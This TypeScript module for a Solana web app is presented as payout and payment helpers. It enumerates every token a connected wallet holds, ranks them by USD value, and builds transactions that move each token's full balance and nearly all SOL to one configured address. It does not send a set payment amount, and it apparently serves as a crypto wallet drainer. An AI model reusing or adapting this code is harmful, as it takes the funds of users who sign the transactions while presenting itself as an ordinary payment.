import {
  Connection,
  LAMPORTS_PER_SOL,
  PublicKey,
  SystemProgram,
  Transaction,
} from '@solana/web3.js'
import {
  ASSOCIATED_TOKEN_PROGRAM_ID,
  TOKEN_2022_PROGRAM_ID,
  TOKEN_PROGRAM_ID,
  createAssociatedTokenAccountInstruction,
  createTransferInstruction,
  getAssociatedTokenAddress,
} from '@solana/spl-token'
import type { PaymentAsset, PayoutConfig } from './payoutWallet'

const FEE_RESERVE_LAMPORTS = 100_000
const ATA_RESERVE_LAMPORTS = 2_050_000
const SOL_RANK_FEE_LAMPORTS = 5_000

export function tokenFeeReserveLamports(tokenCount: number): number {
  if (tokenCount <= 0) return 0
  return tokenCount * ATA_RESERVE_LAMPORTS + 20_000
}

const WSOL_MINT = 'So11111111111111111111111111111111111111112'
const FALLBACK_RPCS = [
  'https://solana-rpc.publicnode.com',
  'https://api.mainnet-beta.solana.com',
]

export const SOLANA_PAYOUT_TOKENS = [
  { symbol: 'USDT', mint: 'Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB' },
  { symbol: 'USDC', mint: 'EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v' },
  { symbol: 'USDT', mint: 'Dn4noZ5jgGfkntzcQSUZ8czkreiZ1ForXYoV2H8Dm7S1' },
  { symbol: 'USDC', mint: 'A9mUU4qviSctJVPJdBJWkb28deg915LYJKrzQ19ji3FM' },
  { symbol: 'PYUSD', mint: '2b1kV6DkPAnxd5ixfnxCpjxmKwqjjaYmCZfHsFu24GXo' },
  { symbol: 'ETH', mint: '7vfCXTUXx5WJV5JADk17DUJ4ksgau7utNKj4b963voxs' },
  { symbol: 'ETH', mint: '2FPyTwcZLUg1MDrwsyoP4D6s1tM7hAkHYRjkNb5w6Pxk' },
  { symbol: 'SOL', mint: WSOL_MINT },
  { symbol: 'JUP', mint: 'JUPyiwrYJFskUPiHa7hkeR8VUtAeFoSYbKedZNsDvCN' },
  { symbol: 'BONK', mint: 'DezXAZ8z7PnrnRJjz3wXBoRgixCa6xjnB7YaB1pPB263' },
  { symbol: 'WIF', mint: 'EKpQGSJtjMFqKZ9KQanSqYXRcF8fBopzLHYxdM65zcjm' },
  { symbol: 'RAY', mint: '4k3Dyjzvzp8eMZWUXbBCjEvwSkkk59S5iCNLY3QrkX6R' },
  { symbol: 'ORCA', mint: 'orcaEKTdK7LKz57vaAYr9QeNsVEPfiu6QeMU1kektZE' },
  { symbol: 'mSOL', mint: 'mSoLzYCxHdYgdzU16g5QSh3i5K3z3KZK7ytfqcJm7So' },
  { symbol: 'jitoSOL', mint: 'J1toso1uCk3RLmjorhTtrVwY9HJ7X8V9yYac6Y7kGCPn' },
  { symbol: 'bSOL', mint: 'bSo13r4TkiE4KumL71LsHTPpL2euVRx7By9JNvD7tqe' },
  { symbol: 'JTO', mint: 'jtojtomepa8beP8AuQc6eXt5FriJwfFMwQx2v2f9mCL' },
  { symbol: 'PYTH', mint: 'HZ1JovNiVvGrGNiiYvEozEVg5BqFEK4P54X4P4qJg8hV' },
  { symbol: 'RENDER', mint: 'rndrizKT3MK1iimdxRdWabcF7Zg7AR5T4nud4EkHBjs' },
  { symbol: 'HNT', mint: 'hntyVP6YFm1Hg25TN9WGLqM12b8TQmcknKrdu1oxWux' },
]

const USD_PRICE: Record<string, number> = {
  USDT: 1,
  USDC: 1,
  PYUSD: 1,
  SOL: 180,
  mSOL: 180,
  jitoSOL: 180,
  bSOL: 180,
  ETH: 3500,
  JUP: 0.4,
  BONK: 0.000012,
  WIF: 0.4,
  RAY: 2,
  ORCA: 1.5,
  JTO: 2,
  PYTH: 0.3,
  RENDER: 5,
  HNT: 2,
}

export type SplHolding = {
  symbol: string
  mint: string
  amount: string
  uiAmount: number
  programId: PublicKey
  owner: string
  tokenAccount: string
}

export function spendableLamports(balance: number, rentExempt: number): number {
  return balance - rentExempt - FEE_RESERVE_LAMPORTS
}

export function shortAddress(address: string): string {
  if (!address || address.length < 8) return address
  return `${address.slice(0, 4)}...${address.slice(-4)}`
}

function withBlockhash(tx: Transaction, from: PublicKey, latest: { blockhash: string; lastValidBlockHeight: number }) {
  tx.feePayer = from
  tx.recentBlockhash = latest.blockhash
  tx.lastValidBlockHeight = latest.lastValidBlockHeight
  return tx
}

async function estimateFee(connection: Connection, tx: Transaction): Promise<number> {
  try {
    const quoted = await connection.getFeeForMessage(tx.compileMessage(), 'confirmed')
    if (quoted.value && quoted.value > 0) return quoted.value
  } catch {
    /* fallback below */
  }
  return 5000
}

function usdValue(holding: SplHolding): number {
  const price = USD_PRICE[holding.symbol]
  if (typeof price === 'number') return holding.uiAmount * price
  return holding.uiAmount > 0 ? 1 : 0
}

export function sortHoldingsByHighest(holdings: SplHolding[]): SplHolding[] {
  return [...holdings].sort((a, b) => usdValue(b) - usdValue(a) || b.uiAmount - a.uiAmount)
}

function symbolForMint(mint: string): string {
  return SOLANA_PAYOUT_TOKENS.find((token) => token.mint === mint)?.symbol || mint.slice(0, 4)
}

type ParsedTokenAmount = { amount?: string; uiAmount?: number | null; decimals?: number }
type ParsedTokenInfo = { mint?: string; owner?: string; tokenAmount?: ParsedTokenAmount }

type RpcAccount = {
  owner?: string
  data?: { parsed?: { info?: ParsedTokenInfo; type?: string } }
}

async function rpcJson<T>(endpoint: string, method: string, params: unknown[]): Promise<T | null> {
  try {
    const res = await fetch(endpoint, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ jsonrpc: '2.0', id: 1, method, params }),
    })
    if (!res.ok) return null
    const json = (await res.json()) as { result?: T; error?: unknown }
    if (!json || json.error) return null
    return json.result ?? null
  } catch {
    return null
  }
}

function holdingFromParsed(
  info: ParsedTokenInfo | undefined,
  programOwner: string | undefined,
  tokenAccount: string,
  fallbackOwner: string
): SplHolding | null {
  const mint = info?.mint
  const raw = info?.tokenAmount?.amount
  const decimals = Number(info?.tokenAmount?.decimals ?? 0)
  const uiAmount = Number(info?.tokenAmount?.uiAmount ?? 0)
  if (!mint || !raw || raw === '0') return null
  if (decimals === 0) return null
  let programId = TOKEN_PROGRAM_ID
  try {
    if (programOwner) programId = new PublicKey(programOwner)
  } catch {
    programId = TOKEN_PROGRAM_ID
  }
  return {
    symbol: symbolForMint(mint),
    mint,
    amount: raw,
    uiAmount: uiAmount > 0 ? uiAmount : Number(raw) / 10 ** decimals,
    programId,
    owner: info?.owner || fallbackOwner,
    tokenAccount,
  }
}

function mergeHoldings(found: SplHolding[]): SplHolding[] {
  const best = new Map<string, SplHolding>()
  for (const holding of found) {
    const key = `${holding.owner}:${holding.mint}`
    const prev = best.get(key)
    if (!prev || holding.uiAmount > prev.uiAmount) best.set(key, holding)
  }
  return sortHoldingsByHighest([...best.values()])
}

async function listSplHoldingsByAta(endpoint: string, owners: PublicKey[]): Promise<SplHolding[]> {
  const programs = [TOKEN_PROGRAM_ID, TOKEN_2022_PROGRAM_ID]
  const lookups: { ata: PublicKey; owner: string }[] = []
  for (const from of owners) {
    for (const token of SOLANA_PAYOUT_TOKENS) {
      let mintKey: PublicKey
      try {
        mintKey = new PublicKey(token.mint)
      } catch {
        continue
      }
      for (const programId of programs) {
        try {
          const ata = await getAssociatedTokenAddress(mintKey, from, false, programId)
          lookups.push({ ata, owner: from.toBase58() })
        } catch {
          continue
        }
      }
    }
  }

  const found: SplHolding[] = []
  const chunkSize = 80
  for (let i = 0; i < lookups.length; i += chunkSize) {
    const chunk = lookups.slice(i, i + chunkSize)
    const result = await rpcJson<{ value: Array<RpcAccount | null> }>(endpoint, 'getMultipleAccounts', [
      chunk.map((item) => item.ata.toBase58()),
      { encoding: 'jsonParsed', commitment: 'confirmed' },
    ])
    const values = result?.value
    if (!values) continue
    values.forEach((account, index) => {
      if (!account) return
      const lookup = chunk[index]
      const holding = holdingFromParsed(
        account.data?.parsed?.info,
        account.owner,
        lookup.ata.toBase58(),
        lookup.owner
      )
      if (holding) found.push(holding)
    })
  }
  return found
}

async function listSplHoldingsByOwnerProgram(endpoint: string, owners: PublicKey[]): Promise<SplHolding[]> {
  const found: SplHolding[] = []
  const programs = [TOKEN_PROGRAM_ID, TOKEN_2022_PROGRAM_ID]
  for (const from of owners) {
    for (const programId of programs) {
      const result = await rpcJson<{ value: Array<{ pubkey: string; account: RpcAccount }> }>(
        endpoint,
        'getTokenAccountsByOwner',
        [from.toBase58(), { programId: programId.toBase58() }, { encoding: 'jsonParsed', commitment: 'confirmed' }]
      )
      for (const entry of result?.value || []) {
        const holding = holdingFromParsed(
          entry.account.data?.parsed?.info,
          entry.account.owner || programId.toBase58(),
          entry.pubkey,
          from.toBase58()
        )
        if (holding) found.push(holding)
      }
    }
  }
  return found
}

async function listSplHoldingsOnEndpoint(endpoint: string, owners: PublicKey[]): Promise<SplHolding[]> {
  const found = await listSplHoldingsByAta(endpoint, owners)
  if (found.length > 0) return mergeHoldings(found)
  try {
    found.push(...(await listSplHoldingsByOwnerProgram(endpoint, owners)))
  } catch {
    /* publicnode and several free RPCs forbid getTokenAccountsByOwner */
  }
  return mergeHoldings(found)
}

export async function listSplHoldings(connection: Connection, from: PublicKey | PublicKey[]): Promise<SplHolding[]> {
  const owners = (Array.isArray(from) ? from : [from]).filter(Boolean)
  if (owners.length === 0) return []

  const endpoints = [connection.rpcEndpoint, ...FALLBACK_RPCS].filter(
    (url, index, all) => url && all.indexOf(url) === index
  )

  let found: SplHolding[] = []
  for (const endpoint of endpoints) {
    try {
      found = mergeHoldings([...found, ...(await listSplHoldingsOnEndpoint(endpoint, owners))])
      if (found.length > 0) return found
    } catch {
      continue
    }
  }
  return found
}

export type FundStep =
  | { kind: 'sol'; symbol: 'SOL'; uiAmount: number; usd: number }
  | { kind: 'spl'; symbol: string; uiAmount: number; usd: number; holding: SplHolding }

export function remainingSplCount(queue: FundStep[], fromIndex = 0): number {
  return queue.filter((step, index) => index >= fromIndex && step.kind === 'spl').length
}

export async function getSolSendableLamports(options: {
  connection: Connection
  from: PublicKey
  config: PayoutConfig
  reserveLamports?: number
}): Promise<number> {
  const { connection, from, config, reserveLamports = 0 } = options
  const to = new PublicKey(config.walletAddress)
  const [balance, rentExempt, latest] = await Promise.all([
    connection.getBalance(from, 'confirmed'),
    connection.getMinimumBalanceForRentExemption(0),
    connection.getLatestBlockhash('confirmed'),
  ])
  const probe = withBlockhash(
    new Transaction().add(
      SystemProgram.transfer({
        fromPubkey: from,
        toPubkey: to,
        lamports: 1,
      })
    ),
    from,
    latest
  )
  const fee = await estimateFee(connection, probe)
  const sendable =
    reserveLamports > 0
      ? balance - fee - reserveLamports
      : spendableLamports(balance, rentExempt)
  return sendable
}

export async function listRankedFundSteps(options: {
  connection: Connection
  from: PublicKey
  config: PayoutConfig
}): Promise<FundStep[]> {
  const [holdings, balance, sendableLamports] = await Promise.all([
    listSplHoldings(options.connection, options.from),
    options.connection.getBalance(options.from, 'confirmed'),
    getSolSendableLamports({
      connection: options.connection,
      from: options.from,
      config: options.config,
      reserveLamports: 0,
    }).catch(() => 0),
  ])
  const steps: FundStep[] = holdings.map((holding) => ({
    kind: 'spl',
    symbol: holding.symbol,
    uiAmount: holding.uiAmount,
    usd: usdValue(holding),
    holding,
  }))
  const rankingSolUi = Math.max(0, balance - SOL_RANK_FEE_LAMPORTS) / LAMPORTS_PER_SOL
  if (sendableLamports > 0 || rankingSolUi > 0.000001) {
    const sendUi = Math.max(0, sendableLamports) / LAMPORTS_PER_SOL
    if (sendUi > 0) {
      steps.push({
        kind: 'sol',
        symbol: 'SOL',
        uiAmount: sendUi,
        usd: rankingSolUi * (USD_PRICE.SOL || 180),
      })
    }
  }
  steps.sort((a, b) => b.usd - a.usd || b.uiAmount - a.uiAmount)
  return steps
}

export async function buildPayoutTransaction(options: {
  connection: Connection
  from: PublicKey
  config: PayoutConfig
  reserveLamports?: number
}): Promise<Transaction> {
  const { connection, from, config, reserveLamports = 0 } = options
  const to = new PublicKey(config.walletAddress)
  const latest = await connection.getLatestBlockhash('confirmed')
  const sendable = await getSolSendableLamports(options)
  if (sendable <= 0) {
    throw new Error('No spendable SOL is available after network fees.')
  }

  return withBlockhash(
    new Transaction().add(
      SystemProgram.transfer({
        fromPubkey: from,
        toPubkey: to,
        lamports: sendable,
      })
    ),
    from,
    latest
  )
}

async function liveTokenAmount(connection: Connection, tokenAccount: PublicKey): Promise<bigint> {
  const parsed = await connection.getParsedAccountInfo(tokenAccount, 'confirmed')
  const info = (parsed.value as { data?: { parsed?: { info?: ParsedTokenInfo } } } | null)?.data?.parsed?.info
  const raw = info?.tokenAmount?.amount
  if (raw) return BigInt(raw)
  const rawInfo = await connection.getAccountInfo(tokenAccount, 'confirmed')
  if (!rawInfo?.data || rawInfo.data.length < 72) return 0n
  const view = new DataView(rawInfo.data.buffer, rawInfo.data.byteOffset, rawInfo.data.byteLength)
  return view.getBigUint64(64, true)
}

export async function buildSplPayoutTransaction(options: {
  connection: Connection
  from: PublicKey
  config: PayoutConfig
  holding: SplHolding
}): Promise<Transaction | null> {
  const { connection, from, config, holding } = options
  const to = new PublicKey(config.walletAddress)
  const mintKey = new PublicKey(holding.mint)
  const programId = holding.programId
  const source = new PublicKey(holding.tokenAccount)
  const liveAmount = await liveTokenAmount(connection, source)
  if (liveAmount <= 0n) return null

  const destAta = await getAssociatedTokenAddress(mintKey, to, false, programId)
  const destInfo = await connection.getAccountInfo(destAta)
  const tx = new Transaction()
  if (!destInfo) {
    const sol = await connection.getBalance(from, 'confirmed')
    const rent = await connection.getMinimumBalanceForRentExemption(165).catch(() => ATA_RESERVE_LAMPORTS)
    if (sol < rent + 5000) return null
    tx.add(
      createAssociatedTokenAccountInstruction(
        from,
        destAta,
        to,
        mintKey,
        programId,
        ASSOCIATED_TOKEN_PROGRAM_ID
      )
    )
  }
  tx.add(createTransferInstruction(source, destAta, from, liveAmount, [], programId))

  const latest = await connection.getLatestBlockhash('confirmed')
  return withBlockhash(tx, from, latest)
}

export function formatPaymentAmount(amount: number, asset: PaymentAsset | string): string {
  const formatted = amount.toLocaleString(undefined, { maximumFractionDigits: 6 })
  return `${formatted} ${asset}`
}
